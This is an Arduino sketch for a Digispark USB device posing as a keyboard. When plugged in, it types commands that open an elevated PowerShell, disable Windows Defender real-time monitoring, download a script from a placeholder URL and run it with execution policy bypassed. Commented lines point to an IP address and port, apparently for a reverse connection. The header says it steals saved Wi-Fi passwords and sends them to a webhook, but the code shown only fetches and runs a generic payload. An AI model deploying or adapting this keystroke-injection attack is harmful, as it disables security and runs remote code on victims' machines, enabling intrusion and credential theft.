/*
  Following payload will grab saved Wifi password and will send them to your hosted webhook.
*/

#include "DigiKeyboard.h"
#define KEY_LEFT_ARROW        0x50
//#define KEY_LEFT_ARROW 0xD8

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
  int runspeed = 500;
  //define led
  pinMode(0, OUTPUT); //led on model b
  pinMode(1, OUTPUT); //led on model a
  DigiKeyboard.delay(3*runspeed);
  //turn light on
  digitalWrite(0, HIGH);
  digitalWrite(1, HIGH);
  DigiKeyboard.sendKeyStroke(0,0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1*runspeed);
  //start powershell as administrator – enables you to bypass exections policy later
  DigiKeyboard.println("powershell start-process powershell.exe -verb runas");
  DigiKeyboard.delay(1*runspeed);
  DigiKeyboard.sendKeyStroke(0,0);
  DigiKeyboard.delay(4*runspeed);
  //DigiKeyboard.sendKeyStroke(KEY_LEFT_ARROW);
  DigiKeyboard.sendKeyStroke(KEY_LEFT_ARROW);
  DigiKeyboard.delay(2*runspeed);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //define payload download location (make sure this is a direct download link)
  DigiKeyboard.delay(3*runspeed);
  DigiKeyboard.println("$url = \"https://test\"");
  DigiKeyboard.update();
  DigiKeyboard.delay(1*runspeed);
  DigiKeyboard.println("Set-MpPreference -DisableRealtimeMonitoring $true");
  DigiKeyboard.update();
  DigiKeyboard.delay(3*runspeed);
  //grabs user name based on logged on user and stores it in $user
  DigiKeyboard.println("$user = [environment]::username");
  DigiKeyboard.update();
  DigiKeyboard.delay(1*runspeed);
  //write to conditional OUTPUT path using the desktop for debugging
  DigiKeyboard.println("$output = \"C:\\Users\\$user\\Desktop\\payload1.ps1\"");
  DigiKeyboard.update();
  DigiKeyboard.delay(1*runspeed);
  //download the payload from the specified url
  DigiKeyboard.println("Invoke-WebRequest -Uri $url -OutFile $output");
  DigiKeyboard.update();
  DigiKeyboard.delay(3*runspeed);
  //-windowstyle hidden
  //\"c:\\Users\\$user\\Desktop\\payload1.ps1 -dest 172.16.31.84 -port 443\"
  //DigiKeyboard.println("payload = \"C:\\Users\\$user\\Desktop\\payload1.ps1\"");
  DigiKeyboard.println("powershell.exe -executionpolicy bypass $output");
  //DigiKeyboard.println("\"C:\\Users\\$user\\Desktop\\payload1.ps1");
  //DigiKeyboard.println("-dest 172.16.31.84 -port 443\"");
  //\"C:\\Users\\$user\\Desktop\\payload1.ps1");
  //-dest 172.16.31.84 -port 443\"
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(100);  
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
  
}
